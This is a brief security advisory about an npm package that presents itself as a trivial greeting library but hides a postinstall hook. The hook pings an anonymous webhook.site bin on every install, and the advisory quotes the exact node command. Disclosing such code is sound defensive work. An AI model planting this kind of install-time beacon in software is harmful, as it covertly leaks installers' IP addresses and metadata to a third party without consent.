summary: postinstall beacon to webhook.site leaks installer metadata
details: On every `npm install`, package.json's postinstall hook executes `node -e "require('https').get('https://webhook.site/206fe563-3cfb-42fc-b589-b8b748b4c640')"`, sending an unconditional HTTPS GET to an anonymous webhook.site inspection bin. webhook.site is a third-party request-capture service whose bins are owned by whoever created them; the request logs the installer's public IP, timing, and HTTP metadata at the bin owner's dashboard. The package advertises itself as a trivial 'greet' library and has no functional reason to phone home. This is an install-time beacon to an attacker-controlled endpoint with no opt-out and no disclosure.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
